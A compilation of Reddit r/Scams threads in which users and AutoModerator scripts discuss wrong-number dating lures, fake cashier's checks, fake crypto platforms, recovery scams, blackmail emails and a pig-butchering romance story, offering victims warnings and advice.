If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- It‚Äôs not even remotely elaborate. 

You don‚Äôt get paid thousands of dollars to click a button. Real companies don‚Äôt pay in crypto. Nor to you have to pay to work. 

These scams are not elaborate. You are giving far too much credit to the scammers. These scams rely on a complete lack of critical thinking skills. That‚Äôs it.
- If you apply critical thinking skills, a task scam can never appear real, because nobody gets paid for doing whatever meaningless task they have you doing.
- "Why, yes, it makes perfect sense for me to get paid hundreds of dollars to do something a Python script could do for three cents of electricity an hour."
- Seriously. It's no exaggeration to say that that there are tons of literal eight year olds in the world that can write the basic code to do this.
- Unlikely that someone falling for task scams has ever heard of python (the language)
- To be fair, probably even a real f*king Python could do some of those ‚Äûtasks‚Äú.

Title: Could this be a scam/lure or am I being paranoid???
Body: About a month ago I got a text from someone asking if this is (my name). When I asked who it was he said he's a guy I met at a bar around 6 months ago. He knew the college I went to, my home town and the current general area I live in. He sent me a picture of himself to jog my memory and when I said I have no idea who he is or any recollection of giving any guy my number, he said things along the lines of "wow guess I'm not that memorable" and "well you don't have to talk to me if you don't want to but I'd love to get a drink this weekend". He couldn't give me any details about what bar, specific dates, etc. and I don't drink enough to forget giving someone my number (it's very rare I give out my phone number at a bar). I told him I wasn't interested and stopped answering after that first conversation but he has texted me every few days since then but I haven't replied, most recent text was a week ago today (innocent texts like merry christmas, happy new year, how have you been). I didn't think too much into any of this conversation, there's a slim chance I actually gave him my number but figured there's always a chance I did.

Then today is when I got weirded out. I get another text that says "Hey (my name)!" ... I responded again asking who it was to which I got a very similar message to the first one explaining how we had met at a bar over the summer, he took my number and never texted me, but now decided to reach out since he moved to the town I live in. His text actually included details that I spoke with the first guy about (I said I remember talking to a couple of guys on a bachelor party weekend and asked if that was his crew - he said no, but guy #2 specifically said he was in town for a bachelor party when we met). Literally had almost the exact same conversation, he sent a picture of himself to help me remember him and when I said I don't his responses were eerily similar to guy #1, like saying "wow guess I'm not that memorable". He asked me to get a drink with him this weekend (tomorrow). 

I might just be being paranoid, there's a VERY slim chance I did just give my number out twice and forget, but I'm 99% sure I did not. Maybe these are just two nice guys looking to get a drink but based on how simular the conversations were, I got really freaked out thinking it's some sort of scam or a lure to try to get me cornered somewhere. Neither guy put a lot of pressure on besides guy #1 continuing to text me the past month.

Please feel free to call me a paranoid maniac or a dumb drunk girl but has anyone ever heard of something like this??? There were no misspellings or any red flags in terms of the formatting of the texts but the similarity between the two situations is just so strange. Maybe I'm being punked by friends, maybe it's just a group of guys messing with me, I don't know. Just super freaked out because they did both know a weird amount of information about me and I'm so sure I would never have forgotten giving my phone number out.

Thank you in advance for any input or guidance!!!

- Almost certainly a scam. If you're worried it might not be, do a fake-out.

Send him a message like this: "Oh yeah now I remember you! Looking forward to seeing you again, do you still drive that pink Toyota? So sorry I threw up in the back seat."

If he plays along you know he's a scammer. If he says "what on earth are you talking about?" maybe he's real.

Most importantly the one thing you know for sure is that it is NOT a guy you remember and want to have a drink with. So don't agree to anything, and blocking him is probably wise.
- It's all BS. Don't engage, or you'll get on the scammer's list of easy targets and be flooded with more of these, from different numbers. Social media has made these scams easier - they get all this information about you from your profile info, and from open posts on your social media or open posts others have tagged you in - then they find your number online and call you saying "didn't you got to school at X/aren't you friends with X..."
- It's a variation of the !wrongnumber¬† scam
- Whether they are a scammer or not, the response ‚Äúwow guess I‚Äôm not that memorable‚Äù is such a turn off to me id be blocking them then and there for being whiny and insecure üòÇ
- You can avoid many scams in life by not responding to random contacts from strangers.  Don't answer unknown callers or texters.
- Don't engage with him. Block him and ignore. The original contact was a lie, and it's not going to get better. This is either a scam (likely) or worse.
- 99% scam.

If either of the guys photos were cute or interesting to you, maybe shift the power in you conversation.  Say "Guys that don't text me for 6 months after giving them my number, I don't meet up with for drinks.  we can catch a coffee, at noon on a Saturday at X if you're interested."

In other words, set all of the parameters.  I suspect you'll get excuses.  Or, he will say yes, but then won't show and will text you his car broke down and he needs $40 for Uber fare or something.  In which case, you'd know for sure it was a scam.
- I would just block them both. I'm speaking as an old guy (so maybe I'm acting over-protective) but you don't need to waste time or get anxious trying to remember two guys you likely never had any interactions with when they claim you did. 

The "information" they know is probably stuff they can easily find in an Internet search on your name, mobile number or address. People are often surprised at how much info is out there - including the stuff posted on social media sites without giving it a second thought (maybe not your case).

Don't fret over this. Block their numbers and move on. Not worth your time or worry.
- That's honestly a great idea, I might try that. Thank you!!! 

You're right, definitely not going to agree to meeting up with anyone. Terrified of what I'd run into if it were some sort of lure attempt. 

I appreciate you!
- I have an extremely unique name, one Google search and it's all me. Hoping I didn't already engage too much üò´
- Hi /u/Helostopper, AutoModerator has been summoned to explain the Wrong number scam.

An intentional wrong number text is the entry point to multiple different types of scams. Because these are so prevalent and lead to several unwelcome outcomes (including you confirming you have a live number, leading to more spam/scams), it is recommended that you do not reply to them, even out of courtesy. They hope to take your courtesy, parlay it into a conversation (often by commenting how nice you are and giving some suggestion of fate in meeting this way), and eventually deploy a scam.

If you received a wrong number inquiry that seems to assume a connection with you (e.g. seeking a specific friend, inquiring about a doctor‚Äôs appointment, asking about a business correspondence, etc.) and there are no pictures included, then you are likely at the beginning of a crypto scam. Use ! crypto without the space to get more info on crypto scams. You can see a video of this scam develop from wrong number to crypto scam at https://www.youtube.com/watch?v=CZ_flb9tGuc

If you receive a random text from a woman that is trying to play up a relationship/hook-up angle and includes an alluring photo, you have encountered what this subreddit often calls the Mandy scam, based on the name used in an early incarnation of it. The replies are sent by a bot and will give the same responses (with some slight variations) regardless of how you respond. The bot also has a few specialized responses that occur when you say words like 'bot' or 'scam'. After a series of replies, it will eventually push you to go to an adult/cam/age verification site. Here are some of the posts on r/scams about the Mandy scam: https://www.reddit.com/r/Scams/search?q=mandy&restrict_sr=on&include_over_18=on&sort=relevance&t=all, you can see that the images, names, and scenarios vary. You can report spam texts by forwarding them to 7726 (SPAM): https://www.consumer.ftc.gov/articles/how-recognize-and-report-spam-text-messages

There is also some evidence that intentional wrong number texts can be part of a data-gathering exercise where each bit of info you give (e.g 'Hi Susan!' and you reply with your name out of courtesy) is collected to be used against you in other scams. Thanks to redditor teratical for this script.

- This seems likely, I unfortunately think I gave too much information in the first conversation not even thinking it could be a scam ü§¶‚Äç‚ôÄÔ∏è
- Omg I totally thought the same üòÇ my response to the first one was "guess I'm not that memorable either if it took you this long to text me" lol
- Say you'd love to meet but need money for an uber and something sexy to wear. Send $250 to my cashap
- Uh, don't do this. 

If this guy (or guys) are scammers, any opening you give them, even "having fun" with them is *never* a good idea. Passing your information to other scammers would be pretty easy, and as soon as you give them an opening, they will push further in to get something from you...likely money or worse.

Do not engage. Block their numbers. Now.
- Just keep blocking and ignoring and he'll go away.
- This is a TERRIBLE idea, even as a joke. The last thing OP should do is play provocative games with someone who could be dangerous. 

Block and ignore. Always.

Title: cashiers check for less than selling amount, no contact after for 2 weeks
Body: Sold and Item online, person didn't have any reviews, but not unheard of and I make sure to cautiously proceed regardless. The person, we will say his name is John Doe-Smith, sent me a cashiers check for less than the full order amount. It wasn't a cheap item, and they sent basically 98% of the funds. The Cashiers check is a US bank and looks legit. The name on it is, let say Jill Smith, so figured it was either his wife/kid/parent as part of the last name is the same. Also something I have seen before, so wasn't a redflag in itself. I deposited it into my bank, and messaged him to let him know it was not the full amount, sometimes people forget to add fees/taxes the website adds, also not unheard of. That was 2 weeks ago, I have sent multiple emails and called the number I had, but no response. 

I was thinking maybe there is some scam angle to this given the few odd things adding up, but can't figure it out. What are your thoughts, is there a scam in place, a scam that fell apart, or just person decided to take a 2 week vacation where they don't have email/phone service?

- Never take a check from a stranger, they can bounce MONTHS later. 

I bet he was planning to have you refund him instead of sending the last 2% then the check bounces and you therefore paid him, but his account got nuked before he could finish the grift on you.
- "Looks legit" is no longer a thing.
- The check is fake. Don‚Äôt spend the money because the bank is going to claw it  back. It could take weeks, but it will.
- My biggest concern here is the litmus test for the legitimacy of the cashiers check seems to be "it looks legit to me."  I mean you no disrespect, but if scammers couldn't make a cashiers check look legit to a seller, their scams would never work.

That said, you are 2 weeks in, so I would give it a little more time and maybe confirm with your bank it is all buttoned up and cleared.  If you are totally good, I would set the money aside, and give whomever a little time to reach back out.  They might hav had some kind of emergency.

But if I had to guess, you got a bogus cashiers check and the scammers, for whatever reason, but their bait and moved on.
- Did you send what they ordered?
- Even a cashiers check? my understanding is those can be faked, but not bounce like a personal check.
- Ya haven't spent it yet incase it was some scam.
- No
- I could write "cashiers check" in crayon on some construction paper. 

People posting in thus sub get absolutely shellacked by "cashiers checks" all the time.
- This is correct. They can‚Äôt bounce, but they can be fraudulent. You can also buy check paper from OfficeDepot with the holograms, watermarks and stuff. It looks like an authentic check. The only problem is the account number is made up.

So it won‚Äôt ‚Äúbounce‚Äù, but it‚Äôs actually worse. It‚Äôs not a mistake or incompetence, it‚Äôs literally fraud. Somebody is committing a crime and you will need to convince the bank that it‚Äôs not you.
- If the check is fake, then it bounces. It's the same thing.
- Legitimate cashiers checks can never bounce, but they can be found to be fake and the bank claws back the funds exactly the same as they do for bounced checks. This happens when they remit the check to the issuing bank and the issuing bank has no record of the account or payment, usually after weeks or months.
- Your best bet is to call your bank's fraud department and explain you accidentally deposited a fake check and hope they let you keep your account.
- yeah you need to call your bank now and inform them that you deposited a fake check and explain the situation to them.
- Great. I would wait until they ask where their stuff is‚Ä¶ Because you‚Äôve already reached out to them. There‚Äôs nothing more for you to worry about.

Do not refund them their money. At least not without having a lengthy discussion with your bank to ensure that you actually ever received it.

~~Keep their money in your account~~ Absolutely do not spend the money or withdraw the funds, such that if/when the bank ~~realizes~~ confirms that it‚Äôs fraud, you have sufficient funds to cover them withdrawing it.

Edit: and yeah: call your bank asap to get them checking.
- I had a neighbor get fed exed a cashiers cheque signed by Benjamin Franklin. Cut and paste right off the US Constitution.
- gotcha. Definitely not a crayon check, looks legit with watermarks, but I know all that can be faked. So sounds like a fake check. If I look up the bank it was done at (not the number on the check obviously), would they be able to verify if it was real or not?
- Ok thanks
- Or, at the very least, call your bank and say you are unsure if the cashier check you deposited was legit.
- This is terrible advice. Don't keep the fake check money in your account, call your bank and tell them of the situation.  
If that check bounces, they may close your account because you're a liability. Don't interact with the scammers any further.
- >Keep their money in your account

No. Contact the bank and let them know you suspect the check is fake. Do what the bank tells you to do.

/modHatOn I am leaving this comment so people know it't not a good idea to keep quiet and hope to keep the money.
- Cam always call the issuing bank to get more info on it.
- Checks aren't like dollar bills. They don't need water marks and special shit to be real or not. You should just never assume a stranger is giving you a check in good faith. Not in this anno domini 2025
- No, the bank cannot confirm for you. There are three ways a check can bounce:

1.) The check was forged - this can be confirmed by calling the issuing bank

2.) The check was for money not in the account - this is the traditional "bouncing" that should be known within a month or so, and can't happen with a cashiers check.

3.) The check is for a real account, but was made out by an unauthorized user - nobody can confirm these until months later after a fraud investigation. There is no safe way to take a check from someone you can't sue for this reason.
- The real issuing bank that has the same routing code as the check has can tell you if they issued the check.  They can't tell you if the check was copied and there are 57 copies of it out there.  They can tell you if it is still valid.

But if it was bought with money from a hacked account, the bank can cancel the check and try to claw back the funds.  So if I hack Joe's account, and spend all Joe's money on cashiers checks, and send them out to people selling stuff, then have them refund me money, I have those people's real money.  If Joe doesn't find out, then only Joe is screwed.  If Joe reports it, the sellers are screwed.
- I'll be calling my bank and the issuing bank Monday to sort it all out.
- Sorry - I actually realized after I posted that - that yeah, calling the back was a given and I should have said so.

Edited for clarity.
- Thanks. This person reached out to me, and their English is bad and just general vibe, it's 100% a scam. Now to clear things up with my bank, block em and learn from this, lucky only my time was wasted.
- I'm pretty sure the issuing bank for a cashier's check can verify whether it's valid or not.
- Call the number on the back of your card. This isn't something you wait until Monday for, it could have bounced long before Monday.
- That's option 1. They can't confirm option 3 because, well, if they knew the check was obtained fraudulently through identity theft they wouldn't have issued it, or if the cashiers check is really issued but the scammer is sending you a forged copy of it then it would appear real to the bank because all the numbers correspond to a real check.
- Ok
- gotcha, that makes sense

- I wouldn't even go this site without being smart enough to set up a virtual PC. Someone told him to go there from social media because he could make way more money there. It's a fake site, what legitimate company would use that domain name? No exchange will charge you to withdraw your own money. He got scammed. Whatever he put in is gone and there was never any profit. No one can help him get it back, they're called recovery scammers
- It's all a scam, there's no way to get his money back.

- **No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.**

No legit company forces you to pay a "fee" or "taxes" to withdraw money. That's just a scam to suck more money out of you.

As others have said, the money is gone. You didn't  invest money, you gave it to the scammers.  **There is no investing site or app, that's all lies, nothing but lies.** There is no profit. The screens that show how much you made? Just numbers on a screen to make you believe that you were making money.  Scammers make a whole fake crypto website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money. Check out other stories on this sub. People lose thousands of dollars / pounds / Euros, they lose all their savings.
- Almost all crypto is a scam with 0 value. And that's before any fake crypto trading platform.....

And every gain he sees is fake becouse they control the website.

Any fee they want as tax etc is just a new scam to bleed him dry.

The money was lost at the same time it was transferred and no-one can get it back. Everyone promises that or hacking is a new scam, recovery scam.
- Your friend might have thought that he was trading crypto and making huge profits.   He was not.  All he did was send money to a scammer, who will keep it.  The scammer tricked your friend with a fake web site.
- All crypto is a scam in exactly the same way banks are a scam. The difference is that crypto is effectively unregulated.

- Hi /u/youroldnemesis, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/.

- Hi /u/youroldnemesis, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: Received a Text Message from ANZ even though I don't use ANZ
Body: I randomly received a text from ANZ, which is an Australian bank (also, the contact name read 'ANZ' and not some random phone number) but the thing is, I don't even use ANZ.

The text message said that I've been enrolled for Voice ID and if it wasn't me I had to call this certain number. when I looked up the number I got no results relating to ANZ.  I'm not sure if this is a scam or someone is really using my phone number to make purchases.

- It's probably a scam but it doesn't matter if you don't bank with them. Usually they just send out mass texts to random numbers with a specific bank because some of the people who get it will inevitably use that bank and be fooled. If it is real and someone just has your phone number attached to their account that's probably going to cause more problems for them than it is for you. If you're really concerned, you could go to the official site for ANZ and find their contact phone number. Ask them if there's an account in your name in case of identity theft. It's possible that they may be able to look up accounts by phone number and see if there's one linked to yours but I wouldn't count on it, and I can't speak for Australia but in the U.S. they wouldn't be able to give you any info about the account anyway if it's not in your name. I don't know how credit reporting works in Australia either but if you were in the U.S. I'd say you could pull a free credit report as well just to check and make sure there aren't any items you don't recognize.

But really it's probably nothing.
- If you do not bank with ANZ, I would say it was a scam given the number doesn't link to ANZ.

Title: The "would you call this number" scam that wasn't a scam
Body: I get so paranoid reading r/scams  that when a women in her 50s or so came up to me at the DMV and asked me to dial a number for me I was sure I was gonna get scammed.  She said she lost her phone,   But I followed the suggestions in this reddit  ( #1 don't let go of your phone)  I dialed the number she wanted, and put it on speaker.  When someone answered,  the woman says "You have my phone where are you?"  "The person that answered told her, and the woman said  "Thank you,  I'll come and get my phone."   I hung up and the woman  thanked me and left.

- As a reminder, you can 'pin' your dialer app before handing a phone over, so that the screen can't be changed without unlocking.
- I had a customer lose his phone once. He came back looking for it and I offered to call his number. When I did, someone I knew answered. They'd found the phone just up the road like it fell off the guy's car.

Worked out.
- It's still possible that was a potential scam because she may have a plan b for when a mark doesn't hand over their phone and this could be that. Who's to say. Good move though!
- Can somebody explain this handing the phone scam? I have been asked before but I literally kept walking without acknowledging the person after a long sob story and blocking my path.
- Doing good samaritan rite. Well done.
- There are some area codes that have automatic $25 or $50 backcharges to your phone number.  Those are late-1990s prices, when this was an early scam on that new thing, the World Wide Web.
- It‚Äôs really inspiring to see how you stayed cautious while still helping someone in need! 

Stories like this remind us that while most people genuinely need help, it‚Äôs important to stay alert. Putting the call on speaker and holding onto your phone was a smart move‚Äîsimple actions like that can go a long way in keeping you safe.

The idea of pinning your dialer app is a great tip too, as it confirms no one can switch to other apps. And setting extra security on your phone, like face recognition or a strong passcode, adds another layer of protection.

Even though this situation seems genuine, it‚Äôs always good to stay aware because scammers can be really creative. 

Have you ever thought about how you‚Äôd handle a similar scenario?
- Yaaaaah. Unless that was her ‚Äúcover story‚Äù bc you didn‚Äôt fall for the trap. ü§∑‚Äç‚ôÄÔ∏è Good job though, OP.
- Just remember, somebody you likely never would have wanted to have your phone number, now has it.
- So you have to be very careful. What seems like a scam may not be a scam, but somebody may try to turn it into a scam. But that in itself may be the scam, so things can get pretty tricky.
- Definitely the right action. It is sad we all need to always be alert to keep ourselves and information safe, but we really should be suspicious, until we can access and evaluate the situation. First maintain your personal space, and should be alert to anyone who violates it. Some of the nicest people you will ever meet are con men/women. When taking out your phone in a situation like this, you should be alert to the actions of the individual you are attempting to help. If they are moving closer to you, stop and tell them to step back 8 to 10 feet. Any hesitation to do this, is a big red light, and you should stop the interaction right then. Also, it is important where this type of interaction takes place, and should not be an isolated area.
- Could have been a scam that you short circuited.  Some will let them handle the phone. You didn‚Äôt. She just called her partners to get away with less suspicion.
- You made the right moves, regardless if this was a scam attempt or not. catjuggler mentions a good point on how scammers might have a plan B, and that could have been what occurred here.

I will say though: I assume DMV's have camera's everywhere near their entrances and inside, so trying to run a scam at a government-affiliated building feels like it'd be a bone-headed move, right? I could be wrong on my assumption though.
- Still not letting anyone use my phone or using my phone on their behalf unless theyre actively on fire
- How do I post a message on this groups board?
- You're probably best served by searching "pin an app" for your device; procedure is pretty different for Android and iPhone.  They both prevent someone from changing to a different app, although they do it in different ways.
- How do you pin your dialer app? O.o
- I read up on that and it sounds like it opens other avenues of risk.  I won't be doing that.
- I've found pinning to be hard to remember the steps.  I would put it on speaker then hit the power button which locks the phone (that's a one-time setting which I always have enabled), then hand the phone to the person (ideally just hold the phone for them of course but sometimes you feel they may want a wee bit of privacy).

Might be easier to do for normal people.
- The person that answered the phone said "XXXXXX Medical Center," which is a medical center in our area.   Still coulda been a scam, but It didn't feel like it.
- Stealing the phone or venmoing themselves money.
- There are many possibilties. None of them good. One is that they aren't going to make a call at all, but instead look for things like venmo/cashapp to drain your funds.
- No one has come up with anything that has actually happened in real life. Every time this gets posted the comments fill up with people saying, very confidently, exactly how they're getting scammed, but it's all just speculation.

Same as whenever someone posts about how a sales person knocks on their door the comments are convinced it's a ploy to "case the place"

90% of the time it's just someone who needs to use the phone.
- Not necessarily. On an iPhone and possibly other types of cell phones, there is setting that you can turn on that blocks your number on all outgoing calls. As a teacher I use this anytime I have to use my personal phone to contact a parent. 

And even if a random stranger got your number through this, it‚Äôs not the end of the world. That‚Äôs what block is for.
- Hundreds of pesky telemarketers have mine...
- For what? Some stranger's number? Who cares? Scammers just call random numbers all day.
- Probably don't have audio. And you ain't getting your money back even if the person were caught.
- Is your phone case heat proof? üî•üòÅ
- What do you want to post about?
- I assume you mean posting to start an initial thread?
- Oh really? Care to elaborate please.
- Why would they answer with the medical center name if she were calling her lost cell phone?
- That makes it seem more like a scam tbh. And part of the script
- I get sick a lot so I still wear a face mask in public, and I have everything set up to only open with my password or my face. I made sure not to allow it to recognize me with my mask on in case someone ever tried taking my phone and pointing it at me to open Venmo or whatever app.
- my phone was stolen when i let someone use it.  was my first phone with internet on it in like 2000. i was distracted by two of their friends when they ran off with it and jumped on a bus.
- The paranoia here is top notch. I couldn't imagine thinking that every stranger I come in contact with is trying to scam me. My life would be much more lonely and I'd have passed up lifelong friendships that I'veade by chance.
- I never answer my phone for strange calls, so no strange caller knows my sex, race?, approx. age.

I like it that way.  Reduces my spearphishability.  YMMV.
- Why would audio be important? If scammers are hanging around a government building in order to scam people, that will likely provide authorities plenty of footage from several angles to help identify the criminal. Which more likely to lead to an arrest.

And getting victims their money back wasn't my point either. My point is just that it seems pretty unlikely would-be criminals are hanging around the DMV, looking for possible marks, in order to commit their crime.

That's all under the assumption that most DMV's have several of cameras inside and outside the building, which I could be totally wrong about.
- Yes. But if youre on fire i think you have bigger problems than asking me for my phoneü§£
- ((Edited to correct pasting error))

I found this on the web... Paraphrasing: 

* If the device is pinned to a particular app, a proactive message is displayed with the steps to exit Screen Pinning mode, making it easy for the user to exit the pinned app unless a password or PIN is set on the device..

So you would need to add another PIN and remember it, to provide the convenience for a stranger to hold your phone in their hand instead of  you dialing and having it on speaker.

* Also, the fact that users can open other apps if they are accessible from within the pinned app and also moving the pinned to the background, therefore, making the Notification Panel accessible, means that your data can be accessed by malicious users and may not be completely secure.

And hey, open up your own phone and look it up yourself.  For your convenience, I attached a picture of what my phone tells me.  Come to your own conclusions, make your own choices.

- Because she didn't call her lost phone. She called the medical center and told them her phone was there and that she was coming to get it.
- She forgot her phone at the medical center, staff picked it up or it was handed in. She didn't remember where she last had it
- Yeah and that's just someone stealing a phone. I'm talking about these weird scenarios where someone dials a number with your phone that kicks off some weird scam setup.
- I doubt many of these people are thinking about cameras. There are cameras in just about every public location a random might come up to you.
- "You have my phone where are you?" is something you say to the person that picks up your cell phone.


Not something you say to the person answering the phone at the front desk of the local medical practice.
- There is a big difference between cameras of a privately-owned business and cameras at a government-owned building though. Authorities wouldn't need to go through as many hoops (though still some) to get the footage, nor meet as much resistance, if they are investigating the crime. The footage is also likely to still be there exist for some time before being archived or deleted, compared to a private company, who doesn't have to follow any standards.

A DMV is also likely to have more of a police presence in the area. They are unlikely to stop the crime if it starts, but just being around generally means would-be criminals aren't hanging around and planning their crimes there usually.

I'm just saying: what are the odds that this 50-something year old woman was hanging around the DMV in order to commit this scam? It would have to be pretty spontaneous of a person to decide to do it there, IMO.
- It sounds more like what you say to someone when you call their cell, not what you say when you dial the desk at a local medical practice. That's a good point.

Title: Cerebrum IQ  - DO NOT USE, THIS IS A SCAM

One week later, I was charged $14.99 and again I tried to contact them for a refund but they tell me I opted to bypass the trial for the actual subscription which is not true.

- !blackmail scam.  
Ignore and delete and change the password.

The email is spoofed.
- Inactive accounts are a favorite entry point for hackers. Use this opportunity to delete as many as you can remember.
- I had same thing basically, email from a random person and they had my password. 

They couldn‚Äôt change it because of 2FA. Just change your password and forget about it.
- I just checked and I had various log in successful attempts, all from today so I do think I've been hacked, but I already changed my password and I will be changing all passwords, but thank you! I know this is generally fake. But the fact that it was on my drafts was what scared me
- Hi /u/great_molassesflood, AutoModerator has been summoned to explain the Blackmail email scam.

The exact wording of the emails varies, but there are generally four main parts. They claim to have installed a RAT (remote access trojan) or any type of software/malware after visiting a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video.

Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. If they had a video of you, they would show it to you to prove that they have it. [Here](http://www.smh.com.au/technology/gadgets-on-the-go/latest-online-scam-aims-to-prick-porn-watchers-guilty-conscience-20170815-gxwvxl.html) are some news [articles](https://www.bbb.org/denver/news-events/news-releases/2017/09/alert-pornography-email-phishing-scam/) about [this](http://blog.dynamoo.com/2017/10/bogus-porn-blackmail-attempt-from.html) scam.

There is a variant with death threats in which they will usually claim that they have been paid to kill you, and will threaten to kill you/your family if you do not pay a Bitcoin ransom. They usually also claim that they will kill your family if you report the email. The emails are spam and can be ignored.

- I didn't know that, I wondered why that account specifically when I haven't even accessed it until a few days ago. It was an old outlook account, and I don't think I have more of those but I do have a few Gmail accounts I don't use so I will be deleting them (although I never had an issue with Gmail, is this more common on microsoft?) thank you for the advice!
- Thank you! What scared me was the fact that the emails were in my drafts and pinned so they obviously accessed my account, I already changed the password, activated the 2FA and I closed it, it'll be deleted on February.
- >I already changed my password and I will be changing all passwords

One very important thing is that you need to make all of the new passwords *different*.  When someone "hacks" into your account like this, it's usually because you used the same password in multiple places, and one of those other places had a security breach.  The hackers got a list of usernames, passwords, and email addresses, and they immediately tried to use them on every single major website on the Internet (a technique called "credential stuffing").

If you never reuse passwords, that technique can't be used to get into your accounts.
- The older the account, the more likely the info will show up on the dark web market. It doesn't have to come from you directly; tons of data is harvested from companies you may have interacted with when their servers are breached. Email accounts of all types are a favorite target because they are a gateway to other, more valuable services like online banking, etc. Also check to make sure none of these old email addresses are still listed as authorized for services you do still use.
- No yeah definitely. I do reuse passwords so that's how they got in lol I should've been more careful so from now on I'm going to use different passwords for everything. Thanks for the advice!
- Yeah, I looked up that email and my password and they were involved in a data breach a few years ago unfortunately so I guess that's how they got in. It scared me but honestly I don't think they'll be able to access anything else from that old account, it was mostly subscribed to forums lol. And I decided to delete, it's set to be permanently deleted in February so hopefully I won't have any more issues with that
- I highly recommend using a password manager. I've been really liking Proton Pass but I'm not sure if there's a free version.

- !advancefee scammer. 

For sites like FB marketplace/offerup and such where it's supposed to be individuals selling off their own items - you should ONLY do cash in person at time of meeting, in a safe location. 

Scammers are all over those sites and if you paid up front using cash transfer apps, they'd pretend to ship and ask you for shipping costs, fake shipping labels, and you never get anything. If it sounds too good to be true - assume it's a scam.

Also, cash transfer apps state in their TOS they should only be used known/trusted contacts only and treated like cash. If you choose to use with a stranger and get scammed, they will not be responsible.
- And because of these scammers I had a heckuva time selling an actual new appliance. Brand new, never used. Bought it and installed it but it didn't fit due to other issues (pro tip: tape measures are your friend) so had to uninstall it. Finally got rid of it for like 25% of retail (luckily I got it on sale for 50% off).
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

- And if they are meeting in person/accepting cash at way below market value it's likely that they're stolen goods.
- True, or fake/knockoffs or defective.

Title: Pig slaughtering (crypto scam)
Body: I‚Äôm so thankful for this Reddit and the fact that my situation could have been so much worse. 

4 months ago I was on this app HER that is geared toward the WLW community. I haven‚Äôt been on a dating app in 8 years, know next to nothing about any current scams but of course felt like I knew what to look out for. 

I matched with this beautiful Asian woman who seemed way too good to be true and also, way too pretty to even be on a dating app, but we matched and started talking right away. The first red flag I ignored  was she wanted me to download Telegram. I brushed it off as her just not wanting to give me her phone number right away and she had mentioned she uses it to keep in contact with family out of the country, made sense to me. The second and third red flags I ignored are the fact that we only ever video chatted and talked on the phone once, and she always had a reason for not wanting to meet up. But no matter because we were clicking and opening up to each other in various ways. We would send each other selfies and pictures during our day to day routine and it was comfortable. Conversations turned sexual and she sent spicy pictures and I sent spicy pictures too (nothing below the waist and never showing anything that anyone could tell it was me, I wasn‚Äôt all together stupid). Eventually she‚Äôs telling me she has love type feelings for me. I don‚Äôt feel the same way but I felt like I was getting close to her.

She was always mentioning how I should invest in crypto, how she had been doing this for years and her uncle helped her learn everything and how successful she was and well off. I always said no, I wasn‚Äôt interested. And she would back off for a while. This went on for 4 months, she would bring it up, tell me I should think about my future, didn‚Äôt I want disposable income? Didn‚Äôt I want to be able to buy a house someday? I always said no. Everything else seemed normal. We had this routine even like she would always message me first thing in the morning, always wanting to know if I was taking care of myself. All these things that made me feel like she cared. 

